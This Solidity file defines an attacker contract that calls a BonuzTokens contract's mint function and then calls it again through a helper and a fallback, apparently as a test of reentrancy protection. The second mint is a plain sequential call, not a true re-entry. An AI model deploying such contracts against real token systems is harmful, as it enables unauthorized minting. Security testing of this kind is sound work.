// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "./BonuzTokens.sol";

contract AttackerContract {
  BonuzTokens bonuzTokens;

  constructor(address _bonuzTokensAddress) {
    bonuzTokens = BonuzTokens(_bonuzTokensAddress);
  }

  function attack(
    address _account,
    string memory _tokenType,
    string memory _name,
    string memory _desc,
    string memory _imageURL,
    bool _isSoulBound,
    uint256 _expiryDate,
    uint256 _points,
    string memory _metadataJson
  ) public {
    // Calling the mint function the first time
    bonuzTokens.mint(
      _account,
      _tokenType,
      _name,
      _desc,
      _imageURL,
      _isSoulBound,
      _expiryDate,
      _points,
      _metadataJson
    );

    // Attempt to re-enter the mint function
    this.reentrantMint();
  }

  function reentrantMint() external {
    // Re-entering the mint function
    bonuzTokens.mint(
      address(this),
      "Reentrant",
      "ReentrantToken",
      "Description",
      "http://example.com/image.jpg",
      false,
      0,
      10,
      "metadataJson"
    );
  }

  // Fallback function used to re-enter the mint function
  fallback() external {
    // Re-entering the mint function
    this.reentrantMint();
  }
}
